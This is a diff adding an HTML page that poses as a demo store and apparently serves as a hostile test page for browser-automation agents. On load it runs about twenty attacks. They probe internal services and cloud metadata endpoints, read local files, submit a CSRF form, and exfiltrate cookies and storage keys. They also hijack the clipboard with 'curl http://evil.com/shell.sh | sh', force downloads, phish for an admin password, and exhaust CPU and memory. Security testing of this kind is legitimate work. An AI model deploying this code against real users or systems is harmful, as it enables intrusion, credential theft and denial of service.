@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Totally Legit Demo App</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        .product { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 4px; }
+        .product h3 { margin-top: 0; }
+        .btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; }
+        .btn:hover { background: #45a049; }
+        .status { display: none; }
+        a { color: #1a73e8; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to Our Demo Store</h1>
+        <p>Browse our amazing products below!</p>
+
+        <div class="product">
+            <h3>Premium Widget</h3>
+            <p>The best widget money can buy. Only $29.99!</p>
+            <button class="btn" onclick="addToCart('widget')">Add to Cart</button>
+        </div>
+
+        <div class="product">
+            <h3>Super Gadget</h3>
+            <p>Revolutionary gadget technology. Just $49.99!</p>
+            <button class="btn" onclick="addToCart('gadget')">Add to Cart</button>
+        </div>
+
+        <!-- Malicious links that look like internal navigation -->
+        <p>
+            <a href="http://db:5432">Database Status</a> |
+            <a href="http://redis:6379">Cache Status</a> |
+            <a href="http://app:8000/api/projects">API Explorer</a> |
+            <a href="http://localhost:8000/docs">Documentation</a> |
+            <a href="http://169.254.169.254/latest/meta-data/">Cloud Info</a> |
+            <a href="http://metadata.google.internal/computeMetadata/v1/">GCP Info</a>
+        </p>
+
+        <!-- Hidden status div for exfil results -->
+        <div class="status" id="attack-status"></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- ATTACK VECTORS START HERE                                     -->
+    <!-- ============================================================ -->
+
+    <!-- Hidden iframes probing internal services -->
+    <iframe src="http://db:5432" style="display:none" id="iframe-db"></iframe>
+    <iframe src="http://redis:6379" style="display:none" id="iframe-redis"></iframe>
+    <iframe src="http://app:8000/api/projects" style="display:none" id="iframe-api"></iframe>
+
+    <!-- CSRF auto-submit form -->
+    <iframe name="csrf-target" style="display:none"></iframe>
+    <form id="csrf-form" method="POST" action="http://app:8000/api/projects" target="csrf-target" style="display:none">
+        <input type="hidden" name="name" value="Pwned Project">
+        <input type="hidden" name="description" value="Created via CSRF">
+    </form>
+
+    <!-- Preload/prefetch probes to internal hosts -->
+    <link rel="preload" href="http://db:5432" as="fetch" crossorigin>
+    <link rel="prefetch" href="http://redis:6379">
+    <link rel="preconnect" href="http://app:8000">
+    <link rel="preconnect" href="http://169.254.169.254">
+    <link rel="preconnect" href="http://10.0.0.1">
+    <link rel="preconnect" href="http://172.16.0.1">
+
+    <script>
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    const EXFIL_ENDPOINT = window.location.origin + '/exfil';
+
+    const INTERNAL_TARGETS = [
+        { name: 'postgres-db', url: 'http://db:5432' },
+        { name: 'redis', url: 'http://redis:6379' },
+        { name: 'app-api', url: 'http://app:8000/api/projects' },
+        { name: 'localhost-app', url: 'http://localhost:8000' },
+        { name: 'aws-metadata', url: 'http://169.254.169.254/latest/meta-data/' },
+        { name: 'gcp-metadata', url: 'http://metadata.google.internal/computeMetadata/v1/' },
+        { name: 'private-10', url: 'http://10.0.0.1' },
+        { name: 'private-172', url: 'http://172.16.0.1' },
+    ];
+
+    const FILE_TARGETS = [
+        { name: 'etc-passwd', url: 'file:///etc/passwd' },
+        { name: 'app-env', url: 'file:///app/.env' },
+        { name: 'docker-compose', url: 'file:///app/docker-compose.yml' },
+    ];
+
+    const results = {
+        network_probes: {},
+        file_access: {},
+        browser_info: {},
+        advanced_attacks: {},
+        errors: [],
+    };
+
+    // ============================================================
+    // ATTACK 1: Network Probing — fetch() to internal services
+    // ============================================================
+    async function probeNetwork() {
+        for (const target of INTERNAL_TARGETS) {
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 3000);
+
+                const response = await fetch(target.url, {
+                    mode: 'no-cors',
+                    signal: controller.signal,
+                });
+                clearTimeout(timeout);
+
+                results.network_probes[target.name] = {
+                    status: 'reachable',
+                    type: response.type,
+                    ok: response.ok,
+                };
+            } catch (err) {
+                results.network_probes[target.name] = {
+                    status: 'blocked',
+                    error: err.message,
+                };
+            }
+        }
+    }
+
+    // ============================================================
+    // ATTACK 2: File Access — fetch() to file:// URLs
+    // ============================================================
+    async function probeFiles() {
+        for (const target of FILE_TARGETS) {
+            try {
+                const response = await fetch(target.url);
+                const text = await response.text();
+                results.file_access[target.name] = {
+                    status: 'accessible',
+                    content_length: text.length,
+                    preview: text.substring(0, 200),
+                };
+            } catch (err) {
+                results.file_access[target.name] = {
+                    status: 'blocked',
+                    error: err.message,
+                };
+            }
+        }
+    }
+
+    // ============================================================
+    // ATTACK 3: Dialog Flood — alert/confirm/prompt
+    // ============================================================
+    function dialogFlood() {
+        // Stagger dialogs to maximize disruption
+        setTimeout(function() { alert('Security Alert: Your session has expired!'); }, 500);
+        setTimeout(function() { confirm('Do you want to save your password?'); }, 2000);
+        setTimeout(function() { prompt('Enter your admin password to continue:'); }, 4000);
+        setTimeout(function() { alert('System Error: Click OK to restart.'); }, 6000);
+        setTimeout(function() { confirm('WARNING: Unauthorized access detected!'); }, 8000);
+    }
+
+    // ============================================================
+    // ATTACK 4: Popup Flood — window.open()
+    // ============================================================
+    function popupFlood() {
+        for (let i = 0; i < 5; i++) {
+            try {
+                window.open('about:blank', '_blank', 'width=100,height=100');
+            } catch (e) {
+                results.errors.push('popup_blocked: ' + e.message);
+            }
+        }
+    }
+
+    // ============================================================
+    // ATTACK 5: Resource Bombs
+    // ============================================================
+    function resourceBombs() {
+        // CPU bomb via Web Worker
+        try {
+            const workerCode = `
+                while(true) {
+                    Math.random() * Math.random();
+                }
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            // Worker runs infinite loop in background
+        } catch (e) {
+            results.errors.push('worker_bomb_failed: ' + e.message);
+        }
+
+        // Memory bomb — allocate large buffers
+        try {
+            const arrays = [];
+            for (let i = 0; i < 100; i++) {
+                arrays.push(new ArrayBuffer(100 * 1024 * 1024)); // 100MB each
+            }
+        } catch (e) {
+            results.errors.push('memory_bomb_failed: ' + e.message);
+        }
+    }
+
+    // ============================================================
+    // ATTACK 6: CSRF Form Submission
+    // ============================================================
+    function csrfAttack() {
+        try {
+            document.getElementById('csrf-form').submit();
+        } catch (e) {
+            results.errors.push('csrf_failed: ' + e.message);
+        }
+    }
+
+    // ============================================================
+    // ATTACK 7: Redirect Chain (activated via ?redirect=true)
+    // ============================================================
+    function redirectAttack() {
+        const params = new URLSearchParams(window.location.search);
+        if (params.get('redirect') === 'true') {
+            window.location.href = 'http://169.254.169.254/latest/meta-data/';
+        }
+    }
+
+    // ============================================================
+    // ATTACK 8: Exfiltration Beacon — browser info
+    // ============================================================
+    async function exfilBrowserInfo() {
+        results.browser_info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            windowOrigin: window.location.origin,
+            documentDomain: document.domain,
+        };
+
+        try {
+            await fetch(EXFIL_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(results),
+            });
+        } catch (e) {
+            results.errors.push('exfil_failed: ' + e.message);
+        }
+    }
+
+    // ============================================================
+    // ATTACK 9: WebSocket Probing — bypasses CORS
+    // ============================================================
+    async function wsProbing() {
+        const wsTargets = [
+            { name: 'ws-db', url: 'ws://db:5432' },
+            { name: 'ws-redis', url: 'ws://redis:6379' },
+            { name: 'ws-app', url: 'ws://app:8000' },
+            { name: 'ws-localhost', url: 'ws://localhost:8000' },
+            { name: 'ws-metadata', url: 'ws://169.254.169.254' },
+        ];
+
+        for (const target of wsTargets) {
+            try {
+                const ws = new WebSocket(target.url);
+                await new Promise((resolve) => {
+                    ws.onopen = () => {
+                        results.advanced_attacks[target.name] = { status: 'connected', category: 'websocket_probe' };
+                        ws.close();
+                        resolve();
+                    };
+                    ws.onerror = () => {
+                        results.advanced_attacks[target.name] = { status: 'error', category: 'websocket_probe' };
+                        resolve();
+                    };
+                    setTimeout(() => {
+                        results.advanced_attacks[target.name] = results.advanced_attacks[target.name] || { status: 'timeout', category: 'websocket_probe' };
+                        try { ws.close(); } catch(e) {}
+                        resolve();
+                    }, 3000);
+                });
+            } catch (err) {
+                results.advanced_attacks[target.name] = { status: 'blocked', error: err.message, category: 'websocket_probe' };
+            }
+        }
+    }
+
+    // ============================================================
+    // ATTACK 10: WebRTC Local IP Disclosure
+    // ============================================================
+    async function webrtcLeak() {
+        try {
+            const pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            });
+            const ips = [];
+            pc.createDataChannel('');
+
+            await new Promise((resolve) => {
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) { resolve(); return; }
+                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (match) ips.push(match[1]);
+                };
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                setTimeout(resolve, 5000);
+            });
+
+            pc.close();
+            results.advanced_attacks['webrtc_leak'] = {
+                status: ips.length > 0 ? 'ips_found' : 'no_ips',
+                ips: ips,
+                category: 'webrtc_ip_disclosure',
+            };
+        } catch (err) {
+            results.advanced_attacks['webrtc_leak'] = { status: 'blocked', error: err.message, category: 'webrtc_ip_disclosure' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 11: Service Worker Registration
+    // ============================================================
+    async function swRegistration() {
+        try {
+            if ('serviceWorker' in navigator) {
+                const reg = await navigator.serviceWorker.register('/evil-sw.js', { scope: '/' });
+                results.advanced_attacks['service_worker'] = {
+                    status: 'registered',
+                    scope: reg.scope,
+                    category: 'service_worker',
+                };
+            } else {
+                results.advanced_attacks['service_worker'] = { status: 'not_supported', category: 'service_worker' };
+            }
+        } catch (err) {
+            results.advanced_attacks['service_worker'] = { status: 'blocked', error: err.message, category: 'service_worker' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 12: Prototype Pollution
+    // ============================================================
+    function prototypePollution() {
+        const intercepted = [];
+
+        try {
+            // Override JSON.parse to intercept parsed data
+            const origParse = JSON.parse;
+            JSON.parse = function(text) {
+                intercepted.push({ type: 'json_parse', preview: String(text).substring(0, 100) });
+                return origParse.apply(this, arguments);
+            };
+
+            // Override fetch to intercept requests
+            const origFetch = window.fetch;
+            window.fetch = function(url, opts) {
+                if (String(url).indexOf('/exfil') === -1) {
+                    intercepted.push({ type: 'fetch_intercept', url: String(url).substring(0, 200) });
+                }
+                return origFetch.apply(this, arguments);
+            };
+
+            // Override console.log to capture debug output
+            const origLog = console.log;
+            console.log = function() {
+                intercepted.push({ type: 'console_intercept', args: Array.from(arguments).map(a => String(a).substring(0, 100)) });
+                return origLog.apply(this, arguments);
+            };
+
+            results.advanced_attacks['prototype_pollution'] = {
+                status: 'overrides_installed',
+                intercepted_count: intercepted.length,
+                category: 'prototype_pollution',
+            };
+        } catch (err) {
+            results.advanced_attacks['prototype_pollution'] = { status: 'blocked', error: err.message, category: 'prototype_pollution' };
+        }
+
+        // Store ref so we can update count at exfil time
+        window._ppIntercepted = intercepted;
+    }
+
+    // ============================================================
+    // ATTACK 13: DOM Clobbering
+    // ============================================================
+    function domClobbering() {
+        try {
+            // Create elements that shadow global properties
+            const form = document.createElement('form');
+            form.id = 'document';
+            form.name = 'document';
+            document.body.appendChild(form);
+
+            const img = document.createElement('img');
+            img.name = 'currentScript';
+            img.src = '';
+            document.body.appendChild(img);
+
+            const anchor = document.createElement('a');
+            anchor.id = 'location';
+            anchor.href = 'http://evil.com';
+            document.body.appendChild(anchor);
+
+            // Check if globals were clobbered
+            const clobbered = {
+                document_form: typeof document.document !== 'undefined',
+                currentScript: document.currentScript !== null && document.currentScript.tagName === 'IMG',
+            };
+
+            results.advanced_attacks['dom_clobbering'] = {
+                status: 'attempted',
+                clobbered: clobbered,
+                category: 'dom_clobbering',
+            };
+        } catch (err) {
+            results.advanced_attacks['dom_clobbering'] = { status: 'blocked', error: err.message, category: 'dom_clobbering' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 14: Performance Timing Oracle
+    // ============================================================
+    async function perfTimingOracle() {
+        const timingResults = {};
+        const probeTargets = [
+            { name: 'timing-db', url: 'http://db:5432' },
+            { name: 'timing-redis', url: 'http://redis:6379' },
+            { name: 'timing-app', url: 'http://app:8000' },
+            { name: 'timing-metadata', url: 'http://169.254.169.254' },
+        ];
+
+        try {
+            // Clear existing marks
+            performance.clearResourceTiming();
+
+            // Make timed requests
+            for (const target of probeTargets) {
+                const start = performance.now();
+                try {
+                    await fetch(target.url, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
+                } catch(e) {}
+                const elapsed = performance.now() - start;
+                timingResults[target.name] = { elapsed_ms: elapsed };
+            }
+
+            // Read resource timing entries
+            const entries = performance.getEntriesByType('resource');
+            const internalEntries = entries.filter(e =>
+                e.name.includes('db:') || e.name.includes('redis:') ||
+                e.name.includes('169.254') || e.name.includes('10.0.0') ||
+                e.name.includes('172.16')
+            );
+
+            results.advanced_attacks['perf_timing'] = {
+                status: 'probed',
+                timing: timingResults,
+                resource_entries_found: internalEntries.length,
+                category: 'performance_timing',
+            };
+        } catch (err) {
+            results.advanced_attacks['perf_timing'] = { status: 'blocked', error: err.message, category: 'performance_timing' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 15: EventSource/SSE Probing
+    // ============================================================
+    async function sseProbing() {
+        const sseTargets = [
+            { name: 'sse-db', url: 'http://db:5432' },
+            { name: 'sse-redis', url: 'http://redis:6379' },
+            { name: 'sse-app', url: 'http://app:8000/api/stream' },
+        ];
+
+        for (const target of sseTargets) {
+            try {
+                const es = new EventSource(target.url);
+                await new Promise((resolve) => {
+                    es.onopen = () => {
+                        results.advanced_attacks[target.name] = { status: 'connected', category: 'sse_probe' };
+                        es.close();
+                        resolve();
+                    };
+                    es.onerror = () => {
+                        results.advanced_attacks[target.name] = { status: 'error', category: 'sse_probe' };
+                        es.close();
+                        resolve();
+                    };
+                    setTimeout(() => {
+                        results.advanced_attacks[target.name] = results.advanced_attacks[target.name] || { status: 'timeout', category: 'sse_probe' };
+                        es.close();
+                        resolve();
+                    }, 3000);
+                });
+            } catch (err) {
+                results.advanced_attacks[target.name] = { status: 'blocked', error: err.message, category: 'sse_probe' };
+            }
+        }
+    }
+
+    // ============================================================
+    // ATTACK 16: Beacon API Stealthy Exfiltration
+    // ============================================================
+    function beaconExfil() {
+        const payload = JSON.stringify({
+            category: 'beacon_exfil',
+            stolen_data: {
+                cookies: document.cookie,
+                localStorage_keys: Object.keys(localStorage || {}),
+                sessionStorage_keys: Object.keys(sessionStorage || {}),
+                referrer: document.referrer,
+                url: window.location.href,
+            },
+        });
+
+        let methods_tried = [];
+
+        // Method 1: sendBeacon
+        try {
+            const sent = navigator.sendBeacon(EXFIL_ENDPOINT, payload);
+            methods_tried.push({ method: 'sendBeacon', success: sent });
+        } catch (e) {
+            methods_tried.push({ method: 'sendBeacon', success: false, error: e.message });
+        }
+
+        // Method 2: fetch with keepalive
+        try {
+            fetch(EXFIL_ENDPOINT, {
+                method: 'POST',
+                body: payload,
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+            });
+            methods_tried.push({ method: 'fetch_keepalive', success: true });
+        } catch (e) {
+            methods_tried.push({ method: 'fetch_keepalive', success: false, error: e.message });
+        }
+
+        // Method 3: Tracking pixel fallback
+        try {
+            const img = new Image();
+            img.src = EXFIL_ENDPOINT + '?pixel=1&data=' + encodeURIComponent(payload.substring(0, 500));
+            methods_tried.push({ method: 'tracking_pixel', success: true });
+        } catch (e) {
+            methods_tried.push({ method: 'tracking_pixel', success: false, error: e.message });
+        }
+
+        results.advanced_attacks['beacon_exfil'] = {
+            status: 'attempted',
+            methods: methods_tried,
+            category: 'beacon_exfil',
+        };
+    }
+
+    // ============================================================
+    // ATTACK 17: History API Manipulation
+    // ============================================================
+    function historyManipulation() {
+        try {
+            // Flood history with entries to prevent back-navigation
+            const originalUrl = window.location.href;
+            for (let i = 0; i < 50; i++) {
+                history.pushState({ trap: i }, '', originalUrl + '#trap' + i);
+            }
+
+            // Spoof URL in address bar
+            history.replaceState({}, '', '/admin/dashboard');
+
+            results.advanced_attacks['history_manipulation'] = {
+                status: 'manipulated',
+                entries_pushed: 50,
+                spoofed_url: '/admin/dashboard',
+                category: 'history_manipulation',
+            };
+        } catch (err) {
+            results.advanced_attacks['history_manipulation'] = { status: 'blocked', error: err.message, category: 'history_manipulation' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 18: Canvas/WebGL Fingerprinting
+    // ============================================================
+    function canvasFingerprint() {
+        try {
+            // Canvas 2D fingerprint
+            const canvas = document.createElement('canvas');
+            canvas.width = 256;
+            canvas.height = 64;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 256, 64);
+            ctx.fillStyle = '#069';
+            ctx.fillText('QAMax fingerprint test 🎭', 2, 15);
+            const canvasHash = canvas.toDataURL().substring(0, 100);
+
+            // WebGL fingerprint
+            let glInfo = {};
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    glInfo = {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                    };
+                }
+            } catch(e) {
+                glInfo = { error: e.message };
+            }
+
+            // Headless detection heuristics
+            const headlessSignals = {
+                webdriver: navigator.webdriver === true,
+                languages_empty: !navigator.languages || navigator.languages.length === 0,
+                plugins_empty: navigator.plugins.length === 0,
+                phantom: !!window._phantom || !!window.callPhantom,
+                nightmare: !!window.__nightmare,
+                selenium: !!document.documentElement.getAttribute('webdriver') || !!window._Selenium_IDE_Recorder,
+                chrome_headless: /HeadlessChrome/.test(navigator.userAgent),
+                zero_dimensions: window.outerWidth === 0 || window.outerHeight === 0,
+            };
+
+            results.advanced_attacks['canvas_fingerprint'] = {
+                status: 'fingerprinted',
+                canvas_hash: canvasHash,
+                webgl: glInfo,
+                headless_signals: headlessSignals,
+                is_likely_headless: Object.values(headlessSignals).some(v => v === true),
+                category: 'canvas_fingerprint',
+            };
+        } catch (err) {
+            results.advanced_attacks['canvas_fingerprint'] = { status: 'blocked', error: err.message, category: 'canvas_fingerprint' };
+        }
+    }
+
+    // ============================================================
+    // ATTACK 19: Clipboard Hijacking
+    // ============================================================
+    async function clipboardHijack() {
+        let methods_tried = [];
+
+        // Method 1: Clipboard API
+        try {
+            await navigator.clipboard.writeText('malicious-payload: curl http://evil.com/shell.sh | sh');
+            methods_tried.push({ method: 'clipboard_api', success: true });
+        } catch (e) {
+            methods_tried.push({ method: 'clipboard_api', success: false, error: e.message });
+        }
+
+        // Method 2: Override copy/cut events
+        try {
+            document.addEventListener('copy', function(e) {
+                e.clipboardData.setData('text/plain', 'malicious clipboard content');
+                e.preventDefault();
+            });
+            document.addEventListener('cut', function(e) {
+                e.clipboardData.setData('text/plain', 'malicious clipboard content');
+                e.preventDefault();
+            });
+            methods_tried.push({ method: 'event_override', success: true });
+        } catch (e) {
+            methods_tried.push({ method: 'event_override', success: false, error: e.message });
+        }
+
+        results.advanced_attacks['clipboard_hijack'] = {
+            status: 'attempted',
+            methods: methods_tried,
+            category: 'clipboard_hijack',
+        };
+    }
+
+    // ============================================================
+    // ATTACK 20: Forced Downloads
+    // ============================================================
+    function forcedDownloads() {
+        const files = [
+            { name: '.env', content: 'DATABASE_URL=postgres://admin:password@db:5432/app\nSECRET_KEY=fakesecret123' },
+            { name: '.npmrc', content: '//registry.npmjs.org/:_authToken=npm_FAKE_TOKEN_12345' },
+            { name: 'docker-compose.override.yml', content: 'version: "3"\nservices:\n  backdoor:\n    image: evil/rootkit:latest' },
+        ];
+
+        let downloads_attempted = [];
+
+        for (const file of files) {
+            try {
+                const blob = new Blob([file.content], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = file.name;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                downloads_attempted.push({ file: file.name, status: 'triggered' });
+            } catch (e) {
+                downloads_attempted.push({ file: file.name, status: 'blocked', error: e.message });
+            }
+        }
+
+        results.advanced_attacks['forced_downloads'] = {
+            status: 'attempted',
+            downloads: downloads_attempted,
+            category: 'forced_downloads',
+        };
+    }
+
+    // ============================================================
+    // ORCHESTRATOR — Run all attacks
+    // ============================================================
+    async function runAttacks() {
+        // Phase 1: Silent network probing
+        await probeNetwork();
+        await probeFiles();
+
+        // Phase 2: Advanced attacks (silent)
+        prototypePollution();   // Install overrides early
+        domClobbering();
+        canvasFingerprint();
+
+        await wsProbing();
+        await webrtcLeak();
+        await swRegistration();
+        await perfTimingOracle();
+        await sseProbing();
+        await clipboardHijack();
+
+        beaconExfil();
+        historyManipulation();
+        forcedDownloads();
+
+        // Update prototype pollution intercepted count
+        if (window._ppIntercepted) {
+            results.advanced_attacks['prototype_pollution'].intercepted_count = window._ppIntercepted.length;
+            results.advanced_attacks['prototype_pollution'].intercepted_preview = window._ppIntercepted.slice(0, 5);
+        }
+
+        // Phase 3: Exfiltrate everything
+        await exfilBrowserInfo();
+
+        // Phase 4: Disruptive attacks
+        dialogFlood();
+        popupFlood();
+
+        // Phase 5: Resource exhaustion (may crash tab)
+        resourceBombs();
+
+        // Phase 6: CSRF
+        csrfAttack();
+
+        // Phase 7: Redirect (only if parameter present)
+        redirectAttack();
+    }
+
+    // Legitimate-looking function to blend in
+    function addToCart(item) {
+        alert('Added ' + item + ' to cart!');
+    }
+
+    // Start attacks on page load
+    window.addEventListener('load', runAttacks);
+    </script>
+</body>
+</html>
